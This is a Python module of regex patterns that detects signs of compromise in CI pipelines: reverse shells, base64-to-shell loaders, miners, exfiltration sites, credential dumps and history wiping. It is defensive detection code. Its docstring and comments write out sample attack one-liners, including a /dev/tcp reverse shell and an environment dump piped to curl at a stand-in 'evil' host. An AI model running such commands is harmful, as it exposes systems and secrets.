"""Shared regexes for evidence-of-malicious-activity detection.

Distinct purpose from the hygiene rules (curl-pipe, TLS bypass, etc.):
those flag *risky defaults* that could one day be exploited; this
module flags *concrete evidence* that an attacker is already using
the pipeline (reverse shells, exfil channels, miner binaries,
obfuscated execution). Findings here are CRITICAL by design and
should gate merges on their own, the cost of a false-negative is
orders of magnitude worse than a false-positive.

Patterns are grouped into categories so a finding can name the
specific class of behavior observed rather than just "something
suspicious":

    category         intent                                    example
    ---------------- ----------------------------------------- ---------------------------
    obfuscated-exec  base64/hex-decoded content piped to shell echo abc== | base64 -d | sh
    reverse-shell    outbound-connect-then-exec primitives     bash -i >& /dev/tcp/10.0.0.1/4444
    crypto-miner     known miner binaries / pool URLs          xmrig --url pool.minexmr.com
    exfil-channel    public drop sites for stolen data         curl -d @x discord.com/api/webhooks/
    credential-exfil env / /etc/shadow dumped to network       env | curl -d @- http://evil/
    audit-erasure    covering-tracks commands                  history -c && unset HISTFILE

Each pattern is narrow. A workflow can legitimately mention "curl"
or "base64"; only the *pipe-to-shell* form of base64 decoding counts
here. False-positive weight matters: an engineer teaching a new hire
by running ``echo hi | base64`` shouldn't trip a CRITICAL finding.
"""
from __future__ import annotations

import re
from dataclasses import dataclass


@dataclass(frozen=True, slots=True)
class MaliciousPattern:
    """A single indicator of compromise.

    ``category`` is the bucket the finding rolls up to; ``name`` is
    the short label ("base64-decoded pipe to shell") that appears in
    the Finding description.
    """
    category: str
    name: str
    pattern: re.Pattern[str]


# Shell-interpreter alternation reused across the obfuscation patterns.
# Catches ``sh`` / ``bash`` / ``dash`` / ``zsh`` / ``ksh`` / ``csh`` /
# ``tcsh`` / ``ash`` (Alpine busybox). The earlier inline form used
# ``(?:ba|d|z|k|t?c)?sh`` which matched ``dsh`` (not a real shell)
# but missed ``dash`` (the system shell on Debian / Ubuntu) entirely
# because ``d?sh`` only consumed one letter. The widened form catches
# both ``dash`` and ``ash`` while keeping the same FP profile.
_SH = r"(?:ba|da|z|k|t?c|a)?sh"

# Long-form base64 decode flag, accepts ``-d`` (POSIX) and
# ``--decode`` (GNU long) and ``-D`` (BSD ``base64`` on macOS).
_B64_DECODE = r"(?:-d|--decode|-D)"

# Base64 payload of plausible attack size. 30+ chars filters out
# tiny benign fragments while still catching minimal shellcode.
_B64_BLOB = r"[A-Za-z0-9+/=]{30,}"


# ── Obfuscated execution ─────────────────────────────────────────────
_OBFUSCATED_EXEC: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "obfuscated-exec", "base64-decoded pipe to shell",
        re.compile(
            rf"(?:echo|printf)\s+[\"']?{_B64_BLOB}[\"']?"
            rf"\s*\|\s*base64\s+{_B64_DECODE}\s*\|\s*{_SH}\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "obfuscated-exec", "base64-decoded command substitution",
        re.compile(
            rf"\$\(\s*(?:echo|printf)\s+[\"']?{_B64_BLOB}[\"']?"
            rf"\s*\|\s*base64\s+{_B64_DECODE}\s*\)",
            re.IGNORECASE,
        ),
    ),
    # Here-string form: ``base64 -d <<< "PAYLOAD" | sh``. No
    # ``echo`` / ``printf`` source, the payload is fed directly via
    # the ``<<<`` redirector. Bash-specific (POSIX ``sh`` doesn't
    # have here-strings) but common in modern attack scripts because
    # it shaves a process off the pipeline.
    MaliciousPattern(
        "obfuscated-exec", "base64 here-string decoded to shell",
        re.compile(
            rf"base64\s+{_B64_DECODE}\s*<<<\s*[\"']?{_B64_BLOB}[\"']?"
            rf"\s*\|\s*{_SH}\b",
            re.IGNORECASE,
        ),
    ),
    # ``openssl base64 -d`` and ``openssl enc -base64 -d`` are
    # alternative base64 decoders attackers use when ``base64`` is
    # filtered or absent. Both forms ship in every distro that has
    # an ``openssl`` binary.
    MaliciousPattern(
        "obfuscated-exec", "openssl base64 decoder to shell",
        re.compile(
            rf"(?:echo|printf)\s+[\"']?{_B64_BLOB}[\"']?"
            rf"\s*\|\s*openssl\s+(?:enc\s+)?-?(?:a|base64)\s+-d\b"
            rf"[^|\n]*\|\s*{_SH}\b",
            re.IGNORECASE,
        ),
    ),
    # Process substitution: ``bash <(curl ... | base64 -d)`` or
    # ``source <(echo PAYLOAD | base64 -d)``. The decoded bytes land
    # on a /dev/fd path that the shell sources as a file, equivalent
    # to pipe-to-shell but harder to spot.
    MaliciousPattern(
        "obfuscated-exec", "process-substitution decoded exec",
        re.compile(
            rf"(?:source|\.|{_SH})\s+<\(\s*"
            rf"[^)\n]*base64\s+{_B64_DECODE}[^)\n]*\)",
            re.IGNORECASE,
        ),
    ),
    # Remote-fetch + decode + execute. The simplest form is
    # ``curl -s URL | base64 -d | bash``. GHA-016 catches plain
    # ``curl | bash`` as a hygiene risk; this rule fires on the
    # encoded variant which has no benign explanation, an installer
    # script fetched over HTTPS doesn't need a base64 wrapper.
    MaliciousPattern(
        "obfuscated-exec", "curl-fetched encoded payload to shell",
        re.compile(
            rf"(?:curl|wget)\s+[^|\n]*\|\s*base64\s+{_B64_DECODE}"
            rf"\s*\|\s*{_SH}\b",
            re.IGNORECASE,
        ),
    ),
    # Decode-then-decompress chain: ``... | base64 -d | gunzip |
    # bash`` (or ``zcat``). The extra gzip layer is what attackers
    # add when the payload is large enough that a single-line base64
    # blob would be flagged by length-based detectors.
    MaliciousPattern(
        "obfuscated-exec", "decode-decompress chain to shell",
        re.compile(
            rf"base64\s+{_B64_DECODE}\s*\|\s*"
            rf"(?:gunzip|gzip\s+-d|zcat|xz\s+-d|unxz|bzcat|bunzip2)\b"
            rf"[^|\n]*\|\s*{_SH}\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "obfuscated-exec", "hex-decoded pipe to shell",
        re.compile(
            rf"(?:echo|printf)\s+[\"']?(?:\\x[0-9a-f]{{2}}){{10,}}[\"']?"
            rf"\s*\|\s*{_SH}\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "obfuscated-exec", "xxd-decoded pipe to shell",
        re.compile(
            rf"\b(?:xxd|od|hexdump)\s+-[rR](?:\s+-p)?\s+[^|]*\|\s*{_SH}\b",
        ),
    ),
    # ``tr``-based decoding. Common rot-style obfuscation:
    # ``echo "..." | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash`` (rot13).
    # The regex narrows to pipes that flow into a shell so plain
    # ``tr`` for text normalization doesn't fire.
    MaliciousPattern(
        "obfuscated-exec", "tr-decoded pipe to shell",
        re.compile(
            rf"\|\s*tr\s+[\"'][^\"'\n]{{2,}}[\"']\s+[\"'][^\"'\n]{{2,}}[\"']"
            rf"\s*\|\s*{_SH}\b",
            re.IGNORECASE,
        ),
    ),
    # ``rev`` reverses bytes. Real attack form is
    # ``echo "REVERSED_PAYLOAD" | rev | bash``. Benign uses of
    # ``rev`` (printing a string backward in a log) don't pipe
    # into a shell.
    MaliciousPattern(
        "obfuscated-exec", "rev-decoded pipe to shell",
        re.compile(
            rf"(?:echo|printf)\s+[\"'][^\"'\n]{{10,}}[\"']\s*\|\s*rev"
            rf"\s*\|\s*{_SH}\b",
            re.IGNORECASE,
        ),
    ),
    # ``python -c 'import base64;exec(base64.b64decode("..."))'``
    # and the shorter ``base64.decodebytes`` form. Requires both a
    # base64 call and an ``exec``/``eval``/``compile`` sink in the
    # same ``-c`` string so unrelated base64 use doesn't fire. Two
    # zero-width lookaheads accept either ordering ("exec wraps
    # base64" or "base64 then exec").
    MaliciousPattern(
        "obfuscated-exec", "python b64decode exec",
        re.compile(
            r"python[23]?\s+-c\s+[\"']"
            r"(?=.{0,500}?(?:base64\.(?:b64decode|decodebytes"
            r"|standard_b64decode)|codecs\.decode\s*\([^)]*"
            r"[\"']base64[\"']))"
            r"(?=.{0,500}?(?:exec|eval|compile)\s*\()",
            re.IGNORECASE | re.DOTALL,
        ),
    ),
    # ``node -e "eval(Buffer.from('...', 'base64').toString())"``
    # is the canonical Node loader. ``Function(...)`` constructor
    # is a common ``eval`` substitute attackers use to dodge naive
    # string-match filters.
    MaliciousPattern(
        "obfuscated-exec", "node Buffer.from base64 eval",
        re.compile(
            r"node\s+-e\s+[\"'][^\"'\n]*"
            r"(?:eval|Function)\s*\(\s*Buffer\.from\s*\("
            r"[^)]*[\"']base64[\"']\s*\)",
            re.IGNORECASE | re.DOTALL,
        ),
    ),
    # ``perl -MMIME::Base64 -e 'eval(decode_base64("..."))'``. The
    # ``MIME::Base64`` module is the standard Perl base64; the
    # decode-then-eval pairing is the tell.
    MaliciousPattern(
        "obfuscated-exec", "perl decode_base64 eval",
        re.compile(
            r"perl\b[^\n]*(?:-MMIME::Base64|use\s+MIME::Base64)"
            r"[^\n]*(?:eval|exec)\s*\(?\s*decode_base64\s*\(",
            re.IGNORECASE | re.DOTALL,
        ),
    ),
    # PowerShell remote-download-and-execute. The classic Cobalt-Strike
    # / commodity-malware shape: pull a script from a URL and pass it
    # straight to ``Invoke-Expression``. Both the long and short forms
    # show up in real intrusions; ``IEX`` and ``Invoke-Expression`` are
    # interchangeable PowerShell aliases.
    MaliciousPattern(
        "obfuscated-exec", "PowerShell DownloadString IEX",
        re.compile(
            r"(?:IEX|Invoke-Expression)\s*\(?\s*"
            r"\(\s*New-Object\s+(?:System\.)?Net\.WebClient\s*\)\s*"
            r"\.\s*DownloadString\s*\(",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "obfuscated-exec", "PowerShell Invoke-WebRequest piped to IEX",
        re.compile(
            r"(?:Invoke-WebRequest|iwr|curl|wget)\s+[^|\n]*\|\s*"
            r"(?:IEX|Invoke-Expression)\b",
            re.IGNORECASE,
        ),
    ),
    # ``IEX ([Text.Encoding]::ASCII.GetString([Convert]::
    # FromBase64String("...")))``. PowerShell's in-language base64
    # decoder, the alternative to ``-enc`` when the attacker is
    # already inside a PowerShell session and wants to dodge
    # command-line argument logging.
    MaliciousPattern(
        "obfuscated-exec", "PowerShell FromBase64String IEX",
        re.compile(
            r"(?:IEX|Invoke-Expression)\b[^\n]*"
            r"\[\s*(?:System\.)?Convert\s*\]\s*::\s*FromBase64String\s*\(",
            re.IGNORECASE,
        ),
    ),
)


# ── Reverse shells ───────────────────────────────────────────────────
_REVERSE_SHELL: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "reverse-shell", "bash /dev/tcp reverse shell",
        re.compile(r"bash\s+-i\s*>&?\s*/dev/(?:tcp|udp)/\S+/\d+"),
    ),
    MaliciousPattern(
        "reverse-shell", "netcat -e reverse shell",
        re.compile(r"\bn(?:c|cat)\b\s+[^|\n]*?\s-e\s+/(?:bin|usr)/"),
    ),
    MaliciousPattern(
        "reverse-shell", "python socket+subprocess reverse shell",
        re.compile(
            r"python[23]?\s+-c\s+['\"]\s*import\s+socket"
            r"[^'\"]*(?:subprocess|os\.dup2)",
            re.DOTALL,
        ),
    ),
    MaliciousPattern(
        "reverse-shell", "mkfifo named-pipe reverse shell",
        re.compile(
            r"mkfifo\s+\S+[;\s]+.*(?:/bin/(?:ba)?sh)\s+-i[^|]*\|\s*(?:nc|ncat|openssl\s+s_client)",
            re.DOTALL,
        ),
    ),
    MaliciousPattern(
        "reverse-shell", "perl socket reverse shell",
        re.compile(
            r"perl\s+-e\s+['\"][^'\"]*use\s+Socket[^'\"]*exec\s*\(\s*['\"]/bin/",
            re.DOTALL,
        ),
    ),
    # ``socat`` is the swiss army knife of reverse-shell tooling: a
    # single binary handling TCP, TLS, and PTY reshaping. The two
    # canonical forms below are the "shell on connect" (TCP-LISTEN
    # passive) and "shell on connect-back" (TCP active). Both pair a
    # network endpoint with ``EXEC:`` or ``SYSTEM:`` running a shell.
    MaliciousPattern(
        "reverse-shell", "socat TCP-EXEC reverse shell",
        re.compile(
            r"\bsocat\b\s+[^\n]*"
            r"(?:TCP|TCP4|TCP6|OPENSSL)(?:-LISTEN|4-LISTEN|6-LISTEN)?:\S+"
            r"\s+(?:EXEC|SYSTEM):",
            re.IGNORECASE,
        ),
    ),
)


# ── Crypto miners ────────────────────────────────────────────────────
_CRYPTO_MINER: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "crypto-miner", "xmrig miner binary",
        re.compile(r"\bxmrig\b(?:[^a-z]|$)", re.IGNORECASE),
    ),
    MaliciousPattern(
        "crypto-miner", "stratum mining pool URL",
        re.compile(r"\bstratum(?:\+ssl|\+tcp)?://", re.IGNORECASE),
    ),
    MaliciousPattern(
        "crypto-miner", "known mining pool hostname",
        re.compile(
            r"\b(?:pool\.minexmr\.com|supportxmr\.com|moneroocean\.stream"
            r"|nanopool\.org|ethermine\.org|f2pool\.com|2miners\.com"
            r"|minergate\.com|unmineable\.com)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "crypto-miner", "coinhive / cryptonight loader",
        re.compile(
            r"\b(?:coin-hive|cryptoloot|jsecoin|crypto-loot"
            r"|webminerpool|coinimp)\b",
            re.IGNORECASE,
        ),
    ),
)


# ── Exfil channels ───────────────────────────────────────────────────
_EXFIL_CHANNEL: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "exfil-channel", "Discord webhook POST",
        re.compile(r"discord(?:app)?\.com/api/webhooks/\d+/\S+", re.IGNORECASE),
    ),
    MaliciousPattern(
        "exfil-channel", "Telegram bot API POST",
        re.compile(r"api\.telegram\.org/bot\d+:[A-Za-z0-9_-]+/", re.IGNORECASE),
    ),
    MaliciousPattern(
        "exfil-channel", "anonymous file-drop site",
        re.compile(
            r"\b(?:transfer\.sh|0x0\.st|file\.io|bashupload\.com"
            r"|termbin\.com|oshi\.at|ttm\.sh|tb\.pypypy\.net"
            r"|paste\.ee|pastebin\.com/raw)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "exfil-channel", "webhook.site collector",
        re.compile(r"\bwebhook\.site/\b", re.IGNORECASE),
    ),
    MaliciousPattern(
        "exfil-channel", "OAST/Collaborator callback",
        re.compile(
            r"\b(?:oast\.(?:pro|fun|live|site|me|online|us)"
            r"|oastify\.com|interactsh-server|interactsh\.com"
            r"|burpcollaborator\.net|canarytokens\.com)\b",
            re.IGNORECASE,
        ),
    ),
    # ngrok / Cloudflare / serveo public-tunneling endpoints. Real
    # development tools used in development; in a CI run they're
    # almost always an exfil tunnel because no production pipeline
    # should ever reach a tunneled developer host. Wildcard subdomain
    # form covers ``abc123.ngrok-free.app`` / ``foo.trycloudflare.com``
    # / ``user.serveo.net``.
    MaliciousPattern(
        "exfil-channel", "ngrok tunnel endpoint",
        re.compile(
            r"\b[\w-]+\.ngrok(?:-free)?\.(?:io|app|dev)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "exfil-channel", "Cloudflare quick tunnel",
        re.compile(r"\b[\w-]+\.trycloudflare\.com\b", re.IGNORECASE),
    ),
    MaliciousPattern(
        "exfil-channel", "serveo SSH tunnel",
        re.compile(r"\b[\w-]+\.serveo\.net\b", re.IGNORECASE),
    ),
    # pipedream / requestbin: the post-webhook.site generation of
    # public collector endpoints. Both let an attacker register a
    # disposable bucket in 30 seconds and POST any payload to it.
    MaliciousPattern(
        "exfil-channel", "pipedream / requestbin collector",
        re.compile(
            r"\b(?:[\w-]+\.m\.pipedream\.net"
            r"|requestbin\.com|requestbin\.net|requestcatcher\.com"
            r"|eo[\w-]+\.m\.pipedream\.net)\b",
            re.IGNORECASE,
        ),
    ),
    # Additional paste / file-drop sites not covered by the earlier
    # ``anonymous file-drop site`` pattern. Mostly cosmetic — the
    # underlying behavior (POST a payload, get a public URL back) is
    # the same — but the IOC list aligns with what current malware
    # actually uses.
    MaliciousPattern(
        "exfil-channel", "secondary paste / drop sites",
        re.compile(
            r"\b(?:dpaste\.com|0bin\.net|ghostbin\.co"
            r"|paste\.bingner\.com|hastebin\.com|paste\.rs"
            r"|controlc\.com|justpaste\.it)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "exfil-channel", "Tor hidden-service URL",
        re.compile(r"\b[a-z2-7]{16,56}\.onion\b", re.IGNORECASE),
    ),
    MaliciousPattern(
        "exfil-channel", "DNS exfiltration via iodine/dnscat",
        re.compile(r"\b(?:iodine|dnscat2?)\b\s+[^-\s]", re.IGNORECASE),
    ),
)


# ── Credential exfil ────────────────────────────────────────────────
_CREDENTIAL_EXFIL: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "credential-exfil", "environment dumped to network",
        re.compile(
            r"(?:env|printenv|set)\s*(?:\|\s*(?:grep|awk|sed)[^|]*)?"
            r"\s*\|\s*(?:curl|wget|nc|ncat)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "credential-exfil", "/etc/passwd or /etc/shadow exfil",
        re.compile(
            r"(?:curl|wget|nc|ncat)\s+[^\n|]*\s(?:-d\s*@|--data-binary\s*@|<)?"
            r"\s*/etc/(?:passwd|shadow|group)",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "credential-exfil", "SSH private key read to network",
        re.compile(
            r"(?:cat|head|tail)\s+[~/.]+ssh/(?:id_(?:rsa|ed25519|ecdsa|dsa)"
            r"|authorized_keys)[^|\n]*\|\s*(?:curl|wget|nc|ncat)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "credential-exfil", "AWS credentials file exfil",
        re.compile(
            r"(?:cat|head|tail)\s+[~/.]+aws/(?:credentials|config)"
            r"[^|\n]*\|\s*(?:curl|wget|nc|ncat)\b",
            re.IGNORECASE,
        ),
    ),
    # Encoded-then-exfil: ``base64 secret | curl ...``. Common in real
    # incidents because the encoded payload survives shell-escaping
    # and IDS pattern matching that targets raw key shapes. Pairs any
    # "encoder" tool (base64 / xxd / hexdump) with the same egress
    # tools as the plain-text variants above.
    MaliciousPattern(
        "credential-exfil", "base64-encoded credential exfil",
        re.compile(
            r"\b(?:base64|xxd|od|hexdump)\b\s+[^|\n]*"
            r"(?:credentials|secret|\.env|id_rsa|id_ed25519|\.aws|\.kube)"
            r"[^|\n]*\|\s*(?:curl|wget|nc|ncat)\b",
            re.IGNORECASE,
        ),
    ),
)


# ── Audit erasure ────────────────────────────────────────────────────
_AUDIT_ERASURE: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "audit-erasure", "shell history erasure",
        re.compile(r"history\s+-c\b|rm\s+[-f]*\s+~?/?\.bash_history\b"),
    ),
    MaliciousPattern(
        "audit-erasure", "HISTFILE / PROMPT_COMMAND unset",
        re.compile(
            r"(?:unset|export\s+-n)\s+"
            r"(?:HISTFILE|HISTSIZE|HISTFILESIZE|PROMPT_COMMAND)\b",
        ),
    ),
    MaliciousPattern(
        "audit-erasure", "systemd journal / syslog wipe",
        re.compile(
            r"journalctl\s+--(?:rotate|vacuum-(?:time|size))\s+--vacuum-time=1s"
            r"|(?:>|truncate\s+-s\s*0)\s+/var/log/(?:syslog|messages|auth\.log)",
        ),
    ),
)


ALL_PATTERNS: tuple[MaliciousPattern, ...] = (
    *_OBFUSCATED_EXEC,
    *_REVERSE_SHELL,
    *_CRYPTO_MINER,
    *_EXFIL_CHANNEL,
    *_CREDENTIAL_EXFIL,
    *_AUDIT_ERASURE,
)


def find_malicious_patterns(
    blob: str, *, suppress_examples: bool = True,
) -> list[tuple[str, str, str]]:
    """Return every matched pattern as ``(category, name, excerpt)``.

    ``excerpt`` is the literal text that matched, truncated to 120
    chars so the finding description stays printable. Matches are
    returned in discovery order (pattern-list order, then position
    within *blob*) so consumers can report the first N hits
    deterministically.

    When ``suppress_examples`` is True (the default), matches that
    appear inside a YAML/HCL key labeled as example/doc/fixture
    content, or next to inline example markers, are filtered out.
    Callers wanting the raw unsuppressed set (e.g. for regression
    tests) can pass ``suppress_examples=False``.
    """
    from ._context import looks_like_example  # local import to avoid cycle
    hits: list[tuple[str, str, str]] = []
    for p in ALL_PATTERNS:
        for m in p.pattern.finditer(blob):
            if suppress_examples and looks_like_example(blob, m.start()):
                continue
            excerpt = m.group(0)
            if len(excerpt) > 120:
                excerpt = excerpt[:117] + "..."
            hits.append((p.category, p.name, excerpt))
    return hits


def summarize_malicious_hits(hits: list[tuple[str, str, str]]) -> str:
    """Format the rule-side description shared by every malicious-activity rule.

    ADO-026 / BB-025 / CC-026 / GHA-027 / GL-025 (and the Jenkins
    JF-029 variant) all assemble the same "N indicator(s)
    (categories). Examples: …" string from a non-empty hit list.
    Centralized here so the prose stays consistent across providers.
    """
    categories = sorted({c for c, _n, _e in hits})
    summary = "; ".join(
        f"{name} ({excerpt!r})" for _cat, name, excerpt in hits[:3]
    )
    return (
        f"{len(hits)} indicator(s) of malicious activity "
        f"({', '.join(categories)}). Examples: {summary}"
        f"{'...' if len(hits) > 3 else ''}."
    )
